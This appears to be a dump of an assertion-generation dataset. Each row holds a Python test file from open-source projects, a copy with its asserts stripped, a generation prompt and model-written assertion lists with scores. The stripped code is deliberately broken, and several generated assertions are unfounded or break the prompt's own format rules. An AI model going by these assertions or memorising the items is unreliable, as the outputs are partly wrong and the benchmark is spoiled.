135        opts, args = getopt.getopt(sys.argv[1:], ""hdpg"", [""help"", ""diff"", ""push"", ""get""])
136    except getopt.GetoptError as err:
137        print(str(err))
138        usage()
139        sys.exit(2)
140    main(opts, args)
141",6663,"[[28, 'config', '!=', None, 'Configuration object should not be None'],
[32, 'site', '!=', None, ""Site object should not be None after connection""],
[33, 'config', '!=', None, 'Configuration object should not be None'],
[38, 'docs', '==', [], 'Empty docs list after reading files from disk'],
[40, 'l', '!=', None, 'List object should not be None'],
[44, 'i', '!=', None, 'Byte object in the list should not be None'],
[50, 'config', '!=', None, 'Configuration object should not be None'],
[56, 'config', '!=', None, 'Configuration object should not be None'],
[56, 'site', '!=', None, 'Site object should not be None'],
[56, 'docs', '!=', None, 'Documents object should not be None'],
[59, 'f', '!=', None, 'Filepath should not be None'],
[68, 'm_onsite', '!=', None, 'The on site hash must not be None'],
[76, 'on_site', '!=', None, 'On site content should not be None'],
[76, 'on_disk', '!=', None, 'On disk content should not be None'],
[82, 'get', '!=', push, 'Get and Push should not be true at the same time'],
[86, 'on_site', '!=', None, 'On site content should not be None'],
[88, 'config', '!=', None, 'Configuration object should not be None'],
[92, 'opts', '!=', None, 'Options must not be None'],
[92, 'args', '!=', None, 'Arguments must not be None'],
[118, 'config', '!=', None, 'Configuration object should not be None'],
[119, 'site', '!=', None, 'Site object should not be None'],
[120, 'docs', '!=', None, 'Documents object should not be None'],
[121, 'config', '!=', None, 'Configuration object should not be None']]"
lumapps/lumbda,"from lumbda.collection import deepgetattr


class MyClass(object):
    def __init__(self, **kwargs):
        for key, value in kwargs.iteritems():
            setattr(self, key, value)


def test_object_hasattr():
    """"""
    Test that the looked for attribute is found when present
    """"""
    my_object = MyClass(attribute=3, sub_object=MyClass(attribute=5))

    assert deepgetattr(my_object, 'attribute') == 3, 'It should return my_object.attribute'
    assert deepgetattr(my_object, 'sub_object.attribute') == 5, 'It should return my_object.sub_object.attribute'


def test_object_doesnt_haveattr():
    """"""
    Test that the return value is the default one when the looked for
    attribute is not present
    """"""
    my_object = MyClass(attribute=3, sub_object=MyClass(attribute=5))

    assert deepgetattr(my_object, 'hello') is None, 'It should return the default value'
    assert deepgetattr(my_object, 'hello', False) is False, 'It should return the given default value'
    assert deepgetattr(my_object, 'hello', 'world') == 'world', 'It should return the given default value'
    assert deepgetattr(my_object, 'hello.world') is None, 'It should return the default value'
    assert deepgetattr(my_object, 'attribute.hello') is None, 'It should return the default value'
    assert deepgetattr(my_object, 'sub_object.hello') is None, 'It should return the default value'
    assert deepgetattr(my_object, '') is None, 'It should return the default value'
","
1from lumbda.collection import deepgetattr
2
3
4class MyClass(object):
5    def __init__(self, **kwargs):
6        for key, value in kwargs.iteritems():
7            setattr(self, key, value)
8
9
10def test_object_hasattr():
11    """"""
12    Test that the looked for attribute is found when present
13    """"""
14    my_object = MyClass(attribute=3, sub_object=MyClass(attribute=5))
15
16
17
18def test_object_doesnt_haveattr():
19    """"""
20    Test that the return value is the default one when the looked for
21    attribute is not present
22    """"""
23    my_object = MyClass(attribute=3, sub_object=MyClass(attribute=5))
24
25","[['deepgetattr(my_object', '==', 'True'], ['deepgetattr(my_object', '==', 'True'], ['deepgetattr(my_object', '==', 'True'], ['deepgetattr(my_object', '==', 'True'], ['deepgetattr(my_object', '==', 'True'], ['deepgetattr(my_object', '==', 'True'], ['deepgetattr(my_object', '==', 'True'], ['deepgetattr(my_object', '==', 'True'], ['deepgetattr(my_object', '==', 'True']]",9,9,1.0,0.0061307901907356,"['**kwargs', 'my_object']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['**kwargs', 'my_object']
*Code:

1from lumbda.collection import deepgetattr
2
3
4class MyClass(object):
5    def __init__(self, **kwargs):
6        for key, value in kwargs.iteritems():
7            setattr(self, key, value)
8
9
10def test_object_hasattr():
11    """"""
12    Test that the looked for attribute is found when present
13    """"""
14    my_object = MyClass(attribute=3, sub_object=MyClass(attribute=5))
15
16
17
18def test_object_doesnt_haveattr():
19    """"""
20    Test that the return value is the default one when the looked for
21    attribute is not present
22    """"""
23    my_object = MyClass(attribute=3, sub_object=MyClass(attribute=5))
24
25",2032,"[5, '**kwargs', '!=', 0, ""The class requires at least one keyword argument to set any attributes""], [14, 'my_object', '!=', None, ""An instance of MyClass should be created""], [23, 'my_object', '!=', None, ""An instance of MyClass should be created""]"
ludoo/python-docx,"# encoding: utf-8

""""""
Step implementations for graphical object (shape) related features
""""""

from __future__ import absolute_import, print_function, unicode_literals

import hashlib

from behave import given, then, when

from docx import Document
from docx.enum.shape import WD_INLINE_SHAPE
from docx.parts.document import InlineShape, InlineShapes
from docx.shared import Inches

from helpers import test_docx, test_file_path


# given ===================================================

@given('a document containing five inline shapes')
def given_a_document_containing_two_inline_shapes(context):
    docx_path = test_docx('shp-inline-shape-access')
    context.document = Document(docx_path)


@given('an inline shape collection containing five shapes')
def given_inline_shape_collection_containing_two_shapes(context):
    docx_path = test_docx('shp-inline-shape-access')
    document = Document(docx_path)
    context.inline_shapes = document.inline_shapes


@given('an inline shape of known dimensions')
def given_inline_shape_of_known_dimensions(context):
    document = Document(test_docx('shp-inline-shape-access'))
    context.inline_shape = document.inline_shapes[0]


@given('an inline shape known to be {shp_of_type}')
def given_inline_shape_known_to_be_shape_of_type(context, shp_of_type):
    inline_shape_idx = {
        'an embedded picture':  0,
        'a linked picture':     1,
        'a link+embed picture': 2,
        'a smart art diagram':  3,
        'a chart':              4,
    }[shp_of_type]
    docx_path = test_docx('shp-inline-shape-access')
    document = Document(docx_path)
    context.inline_shape = document.inline_shapes[inline_shape_idx]


# when =====================================================

@when('I add an inline picture from a file-like object')
def when_add_inline_picture_from_file_like_object(context):
    document = context.document
    with open(test_file_path('monty-truth.png'), 'rb') as f:
        context.inline_shape = document.inline_shapes.add_picture(f)


@when('I add an inline picture to the document')
def when_add_inline_picture_to_document(context):
    document = context.document
    context.inline_shape = (document.inline_shapes.add_picture(
        test_file_path('monty-truth.png')
    ))


@when('I change the dimensions of the inline shape')
def when_change_dimensions_of_inline_shape(context):
    inline_shape = context.inline_shape
    inline_shape.width = Inches(1)
    inline_shape.height = Inches(0.5)


# then =====================================================

@then('I can access each inline shape by index')
def then_can_access_each_inline_shape_by_index(context):
    inline_shapes = context.inline_shapes
    for idx in range(2):
        inline_shape = inline_shapes[idx]
        assert isinstance(inline_shape, InlineShape)


@then('I can access the inline shape collection of the document')
def then_can_access_inline_shape_collection_of_document(context):
    document = context.document
    inline_shapes = document.inline_shapes
    assert isinstance(inline_shapes, InlineShapes)


@then('I can iterate over the inline shape collection')
def then_can_iterate_over_inline_shape_collection(context):
    inline_shapes = context.inline_shapes
    shape_count = 0
    for inline_shape in inline_shapes:
        shape_count += 1
        assert isinstance(inline_shape, InlineShape)
    expected_count = 5
    assert shape_count == expected_count, (
        'expected %d, got %d' % (expected_count, shape_count)
    )


@then('its inline shape type is {shape_type}')
def then_inline_shape_type_is_shape_type(context, shape_type):
    expected_value = {
        'WD_INLINE_SHAPE.CHART':          WD_INLINE_SHAPE.CHART,
        'WD_INLINE_SHAPE.LINKED_PICTURE': WD_INLINE_SHAPE.LINKED_PICTURE,
        'WD_INLINE_SHAPE.PICTURE':        WD_INLINE_SHAPE.PICTURE,
        'WD_INLINE_SHAPE.SMART_ART':      WD_INLINE_SHAPE.SMART_ART,
    }[shape_type]
    inline_shape = context.inline_shape
    assert inline_shape.type == expected_value


@then('the dimensions of the inline shape match the known values')
def then_dimensions_of_inline_shape_match_known_values(context):
    inline_shape = context.inline_shape
    assert inline_shape.width == 1778000, 'got %s' % inline_shape.width
    assert inline_shape.height == 711200, 'got %s' % inline_shape.height


@then('the dimensions of the inline shape match the new values')
def then_dimensions_of_inline_shape_match_new_values(context):
    inline_shape = context.inline_shape
    assert inline_shape.width == 914400, 'got %s' % inline_shape.width
    assert inline_shape.height == 457200, 'got %s' % inline_shape.height


@then('the document contains the inline picture')
def then_the_document_contains_the_inline_picture(context):
    document = context.document
    picture_shape = document.inline_shapes[0]
    blip = picture_shape._inline.graphic.graphicData.pic.blipFill.blip
    rId = blip.embed
    image_part = document._document_part.related_parts[rId]
    image_sha1 = hashlib.sha1(image_part.blob).hexdigest()
    expected_sha1 = '79769f1e202add2e963158b532e36c2c0f76a70c'
    assert image_sha1 == expected_sha1, (
        ""image SHA1 doesn't match, expected %s, got %s"" %
        (expected_sha1, image_sha1)
    )


@then('the length of the inline shape collection is 5')
def then_len_of_inline_shape_collection_is_5(context):
    inline_shapes = context.document.inline_shapes
    shape_count = len(inline_shapes)
    assert shape_count == 5, 'got %s' % shape_count
","
1# encoding: utf-8
2
3""""""
4Step implementations for graphical object (shape) related features
5""""""
6
7from __future__ import absolute_import, print_function, unicode_literals
8
9import hashlib
10
11from behave import given, then, when
12
13from docx import Document
14from docx.enum.shape import WD_INLINE_SHAPE
15from docx.parts.document import InlineShape, InlineShapes
16from docx.shared import Inches
17
18from helpers import test_docx, test_file_path
19
20
21# given ===================================================
22
23@given('a document containing five inline shapes')
24def given_a_document_containing_two_inline_shapes(context):
25    docx_path = test_docx('shp-inline-shape-access')
26    context.document = Document(docx_path)
27
28
29@given('an inline shape collection containing five shapes')
30def given_inline_shape_collection_containing_two_shapes(context):
31    docx_path = test_docx('shp-inline-shape-access')
32    document = Document(docx_path)
33    context.inline_shapes = document.inline_shapes
34
35
36@given('an inline shape of known dimensions')
37def given_inline_shape_of_known_dimensions(context):
38    document = Document(test_docx('shp-inline-shape-access'))
39    context.inline_shape = document.inline_shapes[0]
40
41
42@given('an inline shape known to be {shp_of_type}')
43def given_inline_shape_known_to_be_shape_of_type(context, shp_of_type):
44    inline_shape_idx = {
45        'an embedded picture':  0,
46        'a linked picture':     1,
47        'a link+embed picture': 2,
48        'a smart art diagram':  3,
49        'a chart':              4,
50    }[shp_of_type]
51    docx_path = test_docx('shp-inline-shape-access')
52    document = Document(docx_path)
53    context.inline_shape = document.inline_shapes[inline_shape_idx]
54
55
56# when =====================================================
57
58@when('I add an inline picture from a file-like object')
59def when_add_inline_picture_from_file_like_object(context):
60    document = context.document
61    with open(test_file_path('monty-truth.png'), 'rb') as f:
62        context.inline_shape = document.inline_shapes.add_picture(f)
63
64
65@when('I add an inline picture to the document')
66def when_add_inline_picture_to_document(context):
67    document = context.document
68    context.inline_shape = (document.inline_shapes.add_picture(
69        test_file_path('monty-truth.png')
70    ))
71
72
73@when('I change the dimensions of the inline shape')
74def when_change_dimensions_of_inline_shape(context):
75    inline_shape = context.inline_shape
76    inline_shape.width = Inches(1)
77    inline_shape.height = Inches(0.5)
78
79
80# then =====================================================
81
82@then('I can access each inline shape by index')
83def then_can_access_each_inline_shape_by_index(context):
84    inline_shapes = context.inline_shapes
85    for idx in range(2):
86        inline_shape = inline_shapes[idx]
87
88
89@then('I can access the inline shape collection of the document')
90def then_can_access_inline_shape_collection_of_document(context):
91    document = context.document
92    inline_shapes = document.inline_shapes
93
94
95@then('I can iterate over the inline shape collection')
96def then_can_iterate_over_inline_shape_collection(context):
97    inline_shapes = context.inline_shapes
98    shape_count = 0
99    for inline_shape in inline_shapes:
100        shape_count += 1
101    expected_count = 5
102        'expected %d, got %d' % (expected_count, shape_count)
103    )
104
105
106@then('its inline shape type is {shape_type}')
107def then_inline_shape_type_is_shape_type(context, shape_type):
108    expected_value = {
109        'WD_INLINE_SHAPE.CHART':          WD_INLINE_SHAPE.CHART,
110        'WD_INLINE_SHAPE.LINKED_PICTURE': WD_INLINE_SHAPE.LINKED_PICTURE,
111        'WD_INLINE_SHAPE.PICTURE':        WD_INLINE_SHAPE.PICTURE,
112        'WD_INLINE_SHAPE.SMART_ART':      WD_INLINE_SHAPE.SMART_ART,
113    }[shape_type]
114    inline_shape = context.inline_shape
115
116
117@then('the dimensions of the inline shape match the known values')
118def then_dimensions_of_inline_shape_match_known_values(context):
119    inline_shape = context.inline_shape
120
121
122@then('the dimensions of the inline shape match the new values')
123def then_dimensions_of_inline_shape_match_new_values(context):
124    inline_shape = context.inline_shape
125
126
127@then('the document contains the inline picture')
128def then_the_document_contains_the_inline_picture(context):
129    document = context.document
130    picture_shape = document.inline_shapes[0]
131    blip = picture_shape._inline.graphic.graphicData.pic.blipFill.blip
132    rId = blip.embed
133    image_part = document._document_part.related_parts[rId]
134    image_sha1 = hashlib.sha1(image_part.blob).hexdigest()
135    expected_sha1 = '79769f1e202add2e963158b532e36c2c0f76a70c'
136        ""image SHA1 doesn't match, expected %s, got %s"" %
137        (expected_sha1, image_sha1)
138    )
139
140
141@then('the length of the inline shape collection is 5')
142def then_len_of_inline_shape_collection_is_5(context):
143    inline_shapes = context.document.inline_shapes
144    shape_count = len(inline_shapes)
145","[['shape_count', '==', 'expected_count'], ['inline_shape.type', '==', 'expected_value'], ['inline_shape.width', '==', '1778000'], ['inline_shape.height', '==', '711200'], ['inline_shape.width', '==', '914400'], ['inline_shape.height', '==', '457200'], ['image_sha1', '==', 'expected_sha1'], ['shape_count', '==', '5']]",11,8,0.7272727272727273,0.001448225923244,"['context', 'docx_path', 'context.document', 'document', 'context.inline_shapes', 'context.inline_shape', 'shp_of_type', 'inline_shape_idx', 'inline_shape', 'inline_shape.width', 'inline_shape.height', 'inline_shapes', 'shape_count', 'expected_count', 'shape_type', 'expected_value', 'picture_shape', 'blip', 'rId', 'image_part', 'image_sha1', 'expected_sha1']",22,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['context', 'docx_path', 'context.document', 'document', 'context.inline_shapes', 'context.inline_shape', 'shp_of_type', 'inline_shape_idx', 'inline_shape', 'inline_shape.width', 'inline_shape.height', 'inline_shapes', 'shape_count', 'expected_count', 'shape_type', 'expected_value', 'picture_shape', 'blip', 'rId', 'image_part', 'image_sha1', 'expected_sha1']
*Code:

1# encoding: utf-8
2
3""""""
4Step implementations for graphical object (shape) related features
5""""""
6
7from __future__ import absolute_import, print_function, unicode_literals
8
9import hashlib
10
11from behave import given, then, when
12
13from docx import Document
14from docx.enum.shape import WD_INLINE_SHAPE
15from docx.parts.document import InlineShape, InlineShapes
16from docx.shared import Inches
17
18from helpers import test_docx, test_file_path
19
20
21# given ===================================================
22
23@given('a document containing five inline shapes')
24def given_a_document_containing_two_inline_shapes(context):
25    docx_path = test_docx('shp-inline-shape-access')
26    context.document = Document(docx_path)
27
28
29@given('an inline shape collection containing five shapes')
30def given_inline_shape_collection_containing_two_shapes(context):
31    docx_path = test_docx('shp-inline-shape-access')
32    document = Document(docx_path)
33    context.inline_shapes = document.inline_shapes
34
35
36@given('an inline shape of known dimensions')
37def given_inline_shape_of_known_dimensions(context):
38    document = Document(test_docx('shp-inline-shape-access'))
39    context.inline_shape = document.inline_shapes[0]
40
41
42@given('an inline shape known to be {shp_of_type}')
43def given_inline_shape_known_to_be_shape_of_type(context, shp_of_type):
44    inline_shape_idx = {
45        'an embedded picture':  0,
46        'a linked picture':     1,
47        'a link+embed picture': 2,
48        'a smart art diagram':  3,
49        'a chart':              4,
50    }[shp_of_type]
51    docx_path = test_docx('shp-inline-shape-access')
52    document = Document(docx_path)
53    context.inline_shape = document.inline_shapes[inline_shape_idx]
54
55
56# when =====================================================
57
58@when('I add an inline picture from a file-like object')
59def when_add_inline_picture_from_file_like_object(context):
60    document = context.document
61    with open(test_file_path('monty-truth.png'), 'rb') as f:
62        context.inline_shape = document.inline_shapes.add_picture(f)
63
64
65@when('I add an inline picture to the document')
66def when_add_inline_picture_to_document(context):
67    document = context.document
68    context.inline_shape = (document.inline_shapes.add_picture(
69        test_file_path('monty-truth.png')
70    ))
71
72
73@when('I change the dimensions of the inline shape')
74def when_change_dimensions_of_inline_shape(context):
75    inline_shape = context.inline_shape
76    inline_shape.width = Inches(1)
77    inline_shape.height = Inches(0.5)
78
79
80# then =====================================================
81
82@then('I can access each inline shape by index')
83def then_can_access_each_inline_shape_by_index(context):
84    inline_shapes = context.inline_shapes
85    for idx in range(2):
86        inline_shape = inline_shapes[idx]
87
88
89@then('I can access the inline shape collection of the document')
90def then_can_access_inline_shape_collection_of_document(context):
91    document = context.document
92    inline_shapes = document.inline_shapes
93
94
95@then('I can iterate over the inline shape collection')
96def then_can_iterate_over_inline_shape_collection(context):
97    inline_shapes = context.inline_shapes
98    shape_count = 0
99    for inline_shape in inline_shapes:
100        shape_count += 1
101    expected_count = 5
102        'expected %d, got %d' % (expected_count, shape_count)
103    )
104
105
106@then('its inline shape type is {shape_type}')
107def then_inline_shape_type_is_shape_type(context, shape_type):
108    expected_value = {
109        'WD_INLINE_SHAPE.CHART':          WD_INLINE_SHAPE.CHART,
110        'WD_INLINE_SHAPE.LINKED_PICTURE': WD_INLINE_SHAPE.LINKED_PICTURE,
111        'WD_INLINE_SHAPE.PICTURE':        WD_INLINE_SHAPE.PICTURE,
112        'WD_INLINE_SHAPE.SMART_ART':      WD_INLINE_SHAPE.SMART_ART,
113    }[shape_type]
114    inline_shape = context.inline_shape
115
116
117@then('the dimensions of the inline shape match the known values')
118def then_dimensions_of_inline_shape_match_known_values(context):
119    inline_shape = context.inline_shape
120
121
122@then('the dimensions of the inline shape match the new values')
123def then_dimensions_of_inline_shape_match_new_values(context):
124    inline_shape = context.inline_shape
125
126
127@then('the document contains the inline picture')
128def then_the_document_contains_the_inline_picture(context):
129    document = context.document
130    picture_shape = document.inline_shapes[0]
131    blip = picture_shape._inline.graphic.graphicData.pic.blipFill.blip
132    rId = blip.embed
133    image_part = document._document_part.related_parts[rId]
134    image_sha1 = hashlib.sha1(image_part.blob).hexdigest()
135    expected_sha1 = '79769f1e202add2e963158b532e36c2c0f76a70c'
136        ""image SHA1 doesn't match, expected %s, got %s"" %
137        (expected_sha1, image_sha1)
138    )
139
140
141@then('the length of the inline shape collection is 5')
142def then_len_of_inline_shape_collection_is_5(context):
143    inline_shapes = context.document.inline_shapes
144    shape_count = len(inline_shapes)
145",6961,"[[24, 'docx_path', '==', 'test_docx(\'shp-inline-shape-access\')', 'Document path must be correctly set to load the document'], [26, 'context.document', '!=', None, 'Document should be correctly loaded from the path'], [31, 'docx_path', '==', 'test_docx(\'shp-inline-shape-access\')', 'Document path must be correctly set to load the document'], [33, 'context.inline_shapes', '!=', None, 'Inline shapes must be extracted correctly from the document'], [38, 'document', '!=', None, 'Document should be correctly loaded from the path'], [39, 'context.inline_shape', '!=', None, 'Inline shape should be correctly loaded'], [52, 'docx_path', '==', 'test_docx(\'shp-inline-shape-access\')', 'Document path must be correctly set to load the document'], [53, 'context.inline_shape', '!=', None, 'Inline shape should be correctly selected based on shape type'], [60, 'document', '!=', None, 'Document should be loaded into context correctly'], [62, 'context.inline_shape', '!=', None, 'Inline shape should be added correctly'], [67, 'document', '!=', None, 'Document should be loaded into context correctly'], [68, 'context.inline_shape', '!=', None, 'Inline shape should be added correctly'], [75, 'inline_shape', '!=', None, 'Inline shape must be loaded from context correctly'], [76, 'inline_shape.width', '==', 'Inches(1)', 'Inline shape width should be set correctly'], [77, 'inline_shape.height', '==', 'Inches(0.5)', 'Inline shape height should be set correctly'], [84, 'inline_shapes', '!=', None, 'Inline shapes must be loaded from context correctly'], [88, 'inline_shape', '!=', None, 'Every shape index from 0 to 1 should retrieve a shape'], [91, 'document', '!=', None, 'Document should be loaded into context correctly'], [92, 'inline_shapes', '!=', None, 'Inline shapes must be loaded from document correctly'], [97, 'inline_shapes', '!=', None, 'Inline shapes must be loaded from context correctly'], [98, 'shape_count', '==', 0, 'Shape count should start from 0'], [101, 'expected_count', '==', 5, 'Expected inline shapes count is 5'], [102, 'shape_count', '==', 'expected_count', 'Shape count must match the expected inline shapes count'], [108, 'expected_value', '!=', None, 'Expected value must be assigned correctly'], [118, 'inline_shape', '!=', None, 'Inline shape should be correctly loaded from context'], [124, 'inline_shape', '!=', None, 'Inline shape should be correctly loaded from context'], [129, 'document', '!=', None, 'Document should be loaded correctly from context'], [130, 'picture_shape', '!=', None, 'Picture shape must be loaded from document correctly'], [133, 'image_part', '!=', None, 'Image part must be correctly extracted through relation id'], [135, 'expected_sha1', '==', '79769f1e202add2e963158b532e36c2c0f76a70c', 'Expected SHA1 hash of image part is given'], [144, 'shape_count', '==', 5, 'The number of shapes in the collection should be 5']]
"
EDUlib/edx-platform,"""""""
Tests for the Video Branding configuration.
""""""

import pytest
from django.core.exceptions import ValidationError
from django.test import TestCase

from lms.djangoapps.branding.models import BrandingInfoConfig


class BrandingInfoConfigTest(TestCase):
    """"""
    Test the BrandingInfoConfig model.
    """"""

    def setUp(self):
        super().setUp()
        self.configuration_string = """"""{
            ""CN"": {
                    ""url"": ""http://www.xuetangx.com"",
                    ""logo_src"": ""http://www.xuetangx.com/static/images/logo.png"",
                    ""logo_tag"": ""Video hosted by XuetangX.com""
            }
        }""""""
        self.config = BrandingInfoConfig(configuration=self.configuration_string)

    def test_create(self):
        """"""
        Tests creation of configuration.
        """"""
        self.config.save()
        assert self.config.configuration == self.configuration_string

    def test_clean_bad_json(self):
        """"""
        Tests if bad Json string was given.
        """"""
        self.config = BrandingInfoConfig(configuration='{""bad"":""test""')
        pytest.raises(ValidationError, self.config.clean)

    def test_get(self):
        """"""
        Tests get configuration from saved string.
        """"""
        self.config.enabled = True
        self.config.save()
        expected_config = {
            ""CN"": {
                ""url"": ""http://www.xuetangx.com"",
                ""logo_src"": ""http://www.xuetangx.com/static/images/logo.png"",
                ""logo_tag"": ""Video hosted by XuetangX.com""
            }
        }
        assert self.config.get_config() == expected_config

    def test_get_not_enabled(self):
        """"""
        Tests get configuration that is not enabled.
        """"""
        self.config.enabled = False
        self.config.save()
        assert self.config.get_config() == {}
","
1""""""
2Tests for the Video Branding configuration.
3""""""
4
5import pytest
6from django.core.exceptions import ValidationError
7from django.test import TestCase
8
9from lms.djangoapps.branding.models import BrandingInfoConfig
10
11
12class BrandingInfoConfigTest(TestCase):
13    """"""
14    Test the BrandingInfoConfig model.
15    """"""
16
17    def setUp(self):
18        super().setUp()
19        self.configuration_string = """"""{
20            ""CN"": {
21                    ""url"": ""http://www.xuetangx.com"",
22                    ""logo_src"": ""http://www.xuetangx.com/static/images/logo.png"",
23                    ""logo_tag"": ""Video hosted by XuetangX.com""
24            }
25        }""""""
26        self.config = BrandingInfoConfig(configuration=self.configuration_string)
27
28    def test_create(self):
29        """"""
30        Tests creation of configuration.
31        """"""
32        self.config.save()
33
34    def test_clean_bad_json(self):
35        """"""
36        Tests if bad Json string was given.
37        """"""
38        self.config = BrandingInfoConfig(configuration='{""bad"":""test""')
39        pytest.raises(ValidationError, self.config.clean)
40
41    def test_get(self):
42        """"""
43        Tests get configuration from saved string.
44        """"""
45        self.config.enabled = True
46        self.config.save()
47        expected_config = {
48            ""CN"": {
49                ""url"": ""http://www.xuetangx.com"",
50                ""logo_src"": ""http://www.xuetangx.com/static/images/logo.png"",
51                ""logo_tag"": ""Video hosted by XuetangX.com""
52            }
53        }
54
55    def test_get_not_enabled(self):
56        """"""
57        Tests get configuration that is not enabled.
58        """"""
59        self.config.enabled = False
60        self.config.save()
61","[['self.config.configuration', '==', 'self.configuration_string'], ['self.config.get_config()', '==', 'expected_config'], ['self.config.get_config()', '==', '{}']]",3,3,1.0,0.0016189962223421,"['self.configuration_string', 'self.config', 'self.config.enabled', 'expected_config']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.configuration_string', 'self.config', 'self.config.enabled', 'expected_config']
*Code:

1""""""
2Tests for the Video Branding configuration.
3""""""
4
5import pytest
6from django.core.exceptions import ValidationError
7from django.test import TestCase
8
9from lms.djangoapps.branding.models import BrandingInfoConfig
10
11
12class BrandingInfoConfigTest(TestCase):
13    """"""
14    Test the BrandingInfoConfig model.
15    """"""
16
17    def setUp(self):
18        super().setUp()
19        self.configuration_string = """"""{
20            ""CN"": {
21                    ""url"": ""http://www.xuetangx.com"",
22                    ""logo_src"": ""http://www.xuetangx.com/static/images/logo.png"",
23                    ""logo_tag"": ""Video hosted by XuetangX.com""
24            }
25        }""""""
26        self.config = BrandingInfoConfig(configuration=self.configuration_string)
27
28    def test_create(self):
29        """"""
30        Tests creation of configuration.
31        """"""
32        self.config.save()
33
34    def test_clean_bad_json(self):
35        """"""
36        Tests if bad Json string was given.
37        """"""
38        self.config = BrandingInfoConfig(configuration='{""bad"":""test""')
39        pytest.raises(ValidationError, self.config.clean)
40
41    def test_get(self):
42        """"""
43        Tests get configuration from saved string.
44        """"""
45        self.config.enabled = True
46        self.config.save()
47        expected_config = {
48            ""CN"": {
49                ""url"": ""http://www.xuetangx.com"",
50                ""logo_src"": ""http://www.xuetangx.com/static/images/logo.png"",
51                ""logo_tag"": ""Video hosted by XuetangX.com""
52            }
53        }
54
55    def test_get_not_enabled(self):
56        """"""
57        Tests get configuration that is not enabled.
58        """"""
59        self.config.enabled = False
60        self.config.save()
61",3258,"[[27, 'self.config', '!=', None, ""config object should be created before testing create""],
[32, 'self.config.enabled', '==', False, ""config object's enabled attribute should be False by default""],
[45, 'self.config.enabled', '==', True, ""The enabled attribute should be True to get configuration from saved string""],
[47, 'expected_config', '!=', None, ""expected_config should not be None""],
[59, 'self.config.enabled', '==', False, ""The enabled attribute should be False to get configuration that is not enabled""]]"
t-wissmann/qutebrowser,"# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:

# Copyright 2017-2020 Florian Bruhin (The Compiler) <mail@qutebrowser.org>
# Copyright 2017-2018 Michal Siedlaczek <michal.siedlaczek@gmail.com>

# This file is part of qutebrowser.
#
# qutebrowser is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# qutebrowser is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.

import logging
import os

import pytest
from PyQt5.QtCore import QLibraryInfo

from qutebrowser.browser.webengine import spell
from qutebrowser.utils import usertypes, qtutils, standarddir


def test_version(message_mock, caplog):
    """"""Tests parsing dictionary version from its file name.""""""
    assert spell.version('en-US-8-0.bdic') == (8, 0)
    assert spell.version('pl-PL-3-0.bdic') == (3, 0)
    with caplog.at_level(logging.WARNING):
        assert spell.version('malformed_filename') is None
    msg = message_mock.getmsg(usertypes.MessageLevel.warning)
    expected = (""Found a dictionary with a malformed name: malformed_filename"")
    assert msg.text == expected


@pytest.mark.parametrize('qt_version, old, subdir', [
    ('5.9', True, 'global_datapath'),
    ('5.9', False, 'global_datapath'),
    ('5.10', True, 'global_datapath'),
    ('5.10', False, 'user_datapath'),
])
def test_dictionary_dir(monkeypatch, qt_version, old, subdir):
    monkeypatch.setattr(qtutils, 'qVersion', lambda: qt_version)
    monkeypatch.setattr(QLibraryInfo, 'location', lambda _: 'global_datapath')
